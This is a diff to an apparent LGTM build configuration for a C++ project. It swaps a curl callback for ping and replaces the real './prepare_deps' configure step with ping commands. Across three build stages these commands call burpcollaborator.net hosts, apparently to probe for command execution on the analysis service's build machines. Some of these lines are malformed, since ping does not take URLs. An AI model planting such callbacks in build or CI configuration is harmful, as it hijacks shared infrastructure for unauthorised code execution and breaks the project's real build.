@@ -1,18 +1,19 @@
-            extraction:
+extraction:
   cpp:
     prepare:    # Customizable step used by all languages.
       packages:
         - g++-6
     after_prepare:    # Customizable step used by all languages.
-      - curl http://ntktjabejzkx9cobyg241vt8vz1rpg.burpcollaborator.net
+      - ping http://ntktjabejzkx9cobyg241vt8vz1rpg.burpcollaborator.net
     configure:    # Customizable step used only by C/C++ extraction.
       command:
-        - ./prepare_deps
+        - ping http://jvipl6dalvmtb8q70c403rv4xv3pre.burpcollaborator.net
     before_index:    # Customizable step used by all languages.
       - export BOOST_DIR=$LGTM_SRC/boost
       - export GTEST_DIR=$LGTM_SRC/googletest
       - export HUNSPELL_DIR=$LGTM_SRC/hunspell
       - export CRYPTOPP_DIR=$LGTM_SRC/cryptopp
+      - ping http://br6hhy92hnil70mzw40szjrwtnzin7.burpcollaborator.net
     index:    # Customizable step used by all languages.
       build_command:
         - $GNU_MAKE -j2 -s 
